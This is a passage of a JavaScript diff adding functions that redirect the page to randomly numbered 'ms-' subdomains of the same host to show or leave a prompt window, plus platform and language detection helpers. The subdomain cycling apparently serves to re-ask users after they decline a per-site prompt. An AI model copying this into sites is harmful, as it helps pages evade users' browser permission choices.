+            return true;
+
+        return false;
+    }
+
+    function redirectToPromptWindow() {
+        var urlObj = new URL(window.location.href);
+        urlObj.searchParams.set('ask', 'yes');
+
+        var hostname = urlObj.hostname.replace(/(ms-[0-9]{1,2}\.)*(.+)/, '$2'),
+            newUrl = urlObj.protocol + '//ms-' + randomInteger(1, 99) + '.' + hostname + urlObj.pathname + urlObj.search;
+
+        window.location.href = newUrl;
+
+        return true;
+    }
+
+    function redirectToSelfWindow() {
+        var urlObj = new URL(window.location.href);
+
+        if(urlObj.searchParams.has('ask'))
+            urlObj.searchParams.delete('ask');
+
+        var hostname = urlObj.hostname.replace(/(ms-[0-9]{1,2}\.)*(.+)/, '$2'),
+            newUrl = urlObj.protocol + '//ms-' + randomInteger(1, 99) + '.' + hostname + urlObj.pathname + urlObj.search;
+
+        window.location.href = newUrl;
+
+        return true;
+    }
+
+    function isMac() {
+        if (navigator.platform.toUpperCase().indexOf('MAC') >= 0)
+            return true;
+
+        return false;
+    }
+
+    function initLang() {
+        var userLang = navigator.language || navigator.userLanguage,
+            language = userLang.substr(0, 2).toLowerCase();
+
+        if(language in self.config.languages)
+            self.config.lang = language;
+    }
+
+    function showPromptWindow() {
+        prompt('self_window_redirect_on_closing', 1, 1);
     }
 }
